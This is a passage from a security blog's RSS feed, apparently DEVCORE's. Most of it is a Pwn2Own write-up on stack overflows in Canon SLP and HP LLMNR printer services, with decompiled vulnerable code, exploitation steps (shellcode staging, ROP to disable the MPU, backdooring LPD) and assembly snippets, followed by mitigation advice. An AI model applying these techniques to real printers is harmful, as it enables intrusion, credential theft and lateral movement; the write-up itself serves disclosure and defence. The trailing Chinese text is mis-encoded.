          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; is a case that handles no escape characters. It checks whether the length exceeds the maximum&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt;. However, in case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; handling escape characters, there is no length check, and the converted result is directly copied to the destination buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once given a long escape characters string, it leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;After finding the vulnerability, the first thing is to see what protection it has to decide on the exploit plan. But after analysis, we found that the Canon printer &lt;strong&gt;does not have any memory-related protection&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No Stack Guard, no DEP and no ASLR, &lt;strong&gt;hacker friendly&lt;/strong&gt; ! Like back to the 90s, just a stack overflow can control the world. Next, like the past stack overflow exploit method, we just need to find a fixed address to store the shellcode, overwrite the return address, and jump to the shellcode. Eventually, we found the &lt;strong&gt;BJNP&lt;/strong&gt; service to store our shellcode.&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP is also a service discovery protocol designed by Canon, and there have been many vulnerabilities in the past. &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; has also exploited Pixma MX925 through this protocol. For more details, please refer to &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;here&lt;/a&gt;. BJNP stores the controllable session data in the global buffer. We can use this function to put our shellcode in a fixed location without strict restrictions.&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Use BJNP to store our shellcode on a global buffer&lt;/li&gt;
  &lt;li&gt;Trigger stack overflow in SLP and overwrite return address&lt;/li&gt;
  &lt;li&gt;Return to the global buffer&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Generally, the Pwn2Own organizer(ZDI) requests participants to prove that we have pwned the target. The presentation method here is up to players. Initially, we wanted to print the logo directly on the LCD screen as we exploited the Lexmark printer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, we spent a lot of time figuring out how to print the image on the screen, which was longer than finding vulnerabilities and writing exploits. In the end, a safer approach was adopted because of the time constraints, directly changing the &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; string and printing it on the screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, it is not that difficult to print the image on the screen. Other teams have found &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;methods&lt;/a&gt;. Those who are interested can try it out :)&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;Some people may wonder how to debug in this environment. There are usually several ways to debug:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Teardown the printer and get debug console.&lt;/li&gt;
  &lt;li&gt;Use an old exploit to install customized debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we have updated to the latest version at that time. There is no known vulnerability in this version, so we need to downgrade the version back. Tearing down the hardware also takes additional time and cost. But we already had a vulnerability at that time, it was not cost-effective to tear down the hardware or downgrade. Finally, we still used the most traditional sleep debug method.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After ROP or executing shellcode, print the result to a web page or other visible place, then call sleep. We can read the result from the web page and finally restart the machine to repeat this process.&lt;/p&gt;

&lt;p&gt;Next, letâ€™s talk about HP printers.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; is very similar to mDNS. It provides base name resolution on the same local link. But it is more straightforward than mDNS and usually also cooperates with some service discovery protocols. Here is a brief introduction to this mechanism:&lt;/p&gt;

&lt;p&gt;In the domain name resolution of the local area network, Client A will first use multicast to find the location of Client C in the local area network.
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After Client C receives, Client C sends it back to Client A, which implements the link-local domain name resolution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LLMNR is mainly based on the &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS packet&lt;/a&gt; format, and the format is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The main format is the header followed by Queries, and Count represents the number of queries of different types.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each DNS Query is composed of many labels, and each label will comprise length and string, as shown in the figure above. There is also a &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; mechanism. Dealing with these is very prone to vulnerabilities. &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;â€œTHE COST OF COMPLEXITY: Different Vulnerabilities While Implementing the Same RFCâ€&lt;/a&gt; at BlackHat 2021 also mentions similar problems.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;Letâ€™s look at HPâ€™s implementation:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int llmnr_process_query(...){
    char result[292];
    consume_labels(llmnr_packet-&amp;gt;qname,result,...);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here you can see that when HP processes LLMNR packets, it passes a fixed size buffer to consume_lables. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;consume_lables&lt;/code&gt; is used to process DNS labels, and the fixed buffer is used to store the results.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int __fastcall consume_labels(char *src, char *dst, llmnr_hdr *a3)
{
  int v3; // r5
  int v4; // r12
  unsigned int len; // r3
  int v6; // r4
  char v7; // r6
  bool v8; // cc
  int v9; // r0
  unsigned __int8 chr; // r6
  int result; // r0

  v3 = 0;
  v4 = 0;
  len = 0;
  v6 = 0;
  while ( 1 )
  {
    chr = src[v3]; //-------------[1]
    if ( !chr )
      break;
    if ( (int)len &amp;lt;= 0 )
    {
      v8 = chr &amp;lt;= 0xC0u;
      if ( chr == 0xC0 )
      {
        v9 = src[v3 + 1];
        v6 = 1;
        v3 = 0;
        src = (char *)a3 + v9;
      }
      else
      {
        len = src[v3++];
        v8 = v4 &amp;lt;= 0;
      }
      if ( !v8 )
        dst[v4++] = &apos;.&apos;;
    }
    else
    {
      v7 = src[v3++];
      len = (char)(len - 1);
      dst[v4++] = v7; //----------[2]
    }
  }
  result = v3 + 1;
  dst[v4] = 0;
  if ( v6 )
    return 2;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; will get the label length and then process it according to the type. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; is used as a case of length. There is no length check here, and the label is directly written into the dst buffer, leading to stack overflow. At this point, we thought we could exploit it in the similar way as Canon. However, when we were writing the exploit, we found that HP printers have more protection mechanisms.&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this case, XN and MPU memory protection mechanisms are enabled, and this vulnerability has more restrictions. We &lt;strong&gt;can only overflow about 0x100 bytes without null byte&lt;/strong&gt;, which significantly restricts our ROP and makes it more challenging. We need to find other vulnerabilities or methods to achieve our goal.&lt;/p&gt;

&lt;p&gt;After a while, we started thinking about how HP printers implement XN(DEP) and MPU. Letâ€™s review HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linked with application code into single image&lt;/li&gt;
  &lt;li&gt;Many tasks run
    &lt;ul&gt;
      &lt;li&gt;in the same virtual address space&lt;/li&gt;
      &lt;li&gt;in kernel-mode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After reviewing, we thought, can we bypass it by understanding the MMU and MPU in HP RTOS?&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;HP M283fdw uses one-level page table translation and each translation table entry for translating a 1MB section. The translation table is located at &lt;strong&gt;0x4003c000&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each translation table entry corresponds to a physical address and the permissions of the section. The CPU determines whether it can be executed or modified according to the entry. The permissions related here are AP, APX, and XN. We can also map any physical address through this translation table entry.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Generally, we can modify the translation table entry through ROP if we have stack overflow under high privileges. But when we tried to write directly to the translation table, the HP printer crashed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We checked and found that the leading cause of the memory fault exception is that Memory Protection Unit(MPU) protects the translation table.&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;The MPU enables you to partition memory into regions and set individual protection attributes for each regions. It is an entirely different mechanism from MMU and is often found in IoT devices. HP enables MPU at boot and defines permissions for each region, so we cannot manipulate the page table.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a long time of reverse engineering and referencing the &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt;, we found that the MPU can be turned off by clearing MPU_CTRL. We found that the location is 0xE0400304, slightly different from ARMâ€™s spec.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;After understanding HPâ€™s MMU and MPU mechanism, we can easily use ROP to turn off the MPU and successfully modify the translation table entry. We can arbitrarily modify the code of any service, and we finally chose &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt;. We modified it into a backdoor, read more payloads to the specified location, and finally executed the shellcode.&lt;/p&gt;

&lt;p&gt;But there is one thing that must be mentioned. After the translation table entry and LPD code are overwritten, be sure to &lt;strong&gt;flush TLB&lt;/strong&gt; and &lt;strong&gt;invalidate I-cache and D-cache&lt;/strong&gt;. Otherwise, it is very likely to execute in the old one, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Trigger stack overflow in LLMNR and overwrite return address&lt;/li&gt;
  &lt;li&gt;Use limited ROP to
    &lt;ul&gt;
      &lt;li&gt;disable MPU&lt;/li&gt;
      &lt;li&gt;modify translation table entry and get read-write execute permission&lt;/li&gt;
      &lt;li&gt;flush TLB&lt;/li&gt;
      &lt;li&gt;modify the code of LPD&lt;/li&gt;
      &lt;li&gt;invalidate I-cache and D-cache&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Use modified LPD to read our shellcode and jump to shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;When we could execute the shellcode, we only had one week left, and we finally chose to use the exact string to display &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; on the LCD.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, we also tried to change the backdoor to the debug console to facilitate many functions, such as viewing memory information, playing music, etc.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; used the function of playing music to present it at that time. It is fascinating. You can go &lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;here&lt;/a&gt; to look at the situation at the Pwn2Own.&lt;/p&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;In Pwn2Own Austin 2021, we got 2nd place after pwning other devices and printers. We had a good experience and learned some new things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;The first is to update regularly. All the printers mentioned have been patched. It is often ignored. We usually find printers lack of update for several years and even leave the default password directly in the corporate intranet.&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;
&lt;p&gt;Another mitigation is to turn off services that are not in use as much as possible. Most printers default enable too many services that are usually unused. We even think that you can turn off the discovery service,
just open the service you want to use.&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;It would be better if you could apply a firewall. Most printers provide related functions.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;With code execution on the printers, in addition to printing things on the LCD, we can use the printer to steal confidential information, whether it is confidential documents or some credential. We can also use the printer for &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_Lateral_Movement&quot;&gt;lateral movement&lt;/a&gt;, and because it is hard to detect, making it an excellent target for the red team.&lt;/p&gt;

&lt;p&gt;By the way, the protocols of the discovery service series on many printers are often vulnerable. If you want to find vulnerabilities in printers or other IoT devices, you can look in this direction.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To Be Continue&lt;/h2&gt;
&lt;p&gt;We also found several vulnerabilities in the printer series at &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; last year. We will be releasing detailed information soon, so stay tuned for Part II.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HITCON 2023 x DEVCORE Wargame: My todolist Write-up</title>
                <description>&lt;p&gt;ç‚ºäº† HITCON 2023 æ´»å‹•ï¼Œæˆ‘ä»Šå¹´ä¹Ÿåœ¨ DEVCORE æ”¤ä½ä¸Šæº–å‚™äº†ä¸‰é¡Œè¶£å‘³æ€§è³ªçš„ Wargame é¡Œç›®è®“åƒè³½è€…åœ¨è½å®Œè­°ç¨‹çš„ç©ºé–’ä¹‹é¤˜å¯ä»¥äº«å—ä¸€ä¸‹è¦ªè‡ªå‹•æ‰‹è§£é¡Œçš„å¿«æ¨‚ï¼Œè€Œé™¤äº†æˆ‘æ‰€æº–å‚™çš„é¡Œç›®ä»¥å¤–ï¼ŒåŒ…æ‹¬å…¶ä»–æ‰€æœ‰é¡Œç›®éƒ½å¯ä»¥åœ¨ä»¥ä¸‹çš„ GitHub repository è£¡æ‰¾åˆ°ï¼š&lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023&quot;&gt;https://github.com/DEVCORE-Wargame/HITCON-2023&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é€™æ¬¡æº–å‚™çš„é¡Œç›®åˆ†åˆ¥æ˜¯ Whatâ€™s my IPã€Submit flag å’Œ My todolistã€‚ç¬¬ä¸€å€‹é¡Œç›® Whatâ€™s my IP åªè¦çœ‹ç¨‹å¼ç¢¼å°±æœƒçŸ¥é“æ˜¯å€‹ HTTP header å½é€  IP åŠ ä¸Š SQL Injectin åˆ©ç”¨çš„ç°¡å–®é¡Œï¼Œåªæ˜¯æ´»å‹•æœŸé–“åƒè³½è€…å€‘å¾—æ†‘è‘—ç¶“é©—èˆ‡é§­å®¢ç›´è¦ºä»¥é»‘ç®±æ–¹å¼æ‰¾å‡ºå¼±é»çš„å­˜åœ¨ã€‚ç¬¬äºŒå€‹é¡Œç›® Submit flag å°±æ˜¯ä¸€å€‹ç¶“å…¸çš„ Race Conditionï¼Œæ˜¯ä¸€å€‹è€æ¢—ä½†ä¹Ÿæ˜¯æ»²é€æ¸¬è©¦ä¸­ç¶“å¸¸è¢«å¿½ç•¥çš„ç´°ç¯€ï¼Œç‚ºäº†æé«˜æˆåŠŸç‡å¾è€Œé¿å…è®“åƒåŠ è€…æµªè²»å¤ªå¤šæ™‚é–“ï¼Œæˆ‘ç‰¹åœ°åœ¨ä¸­é–“æ’å…¥ä¸å¿…è¦çš„ sleepï¼Œé›–ç„¶å¯èƒ½è®“é¡Œç›®è®Šå¾—éæ–¼ç°¡å–®ï¼Œå¸Œæœ›è‡³å°‘èƒ½æé†’å¤§å®¶å›æƒ³èµ·é‚„å­˜åœ¨é€™ç¨®å¼±é»å°±å¤ªå¥½äº†ã€‚&lt;/p&gt;

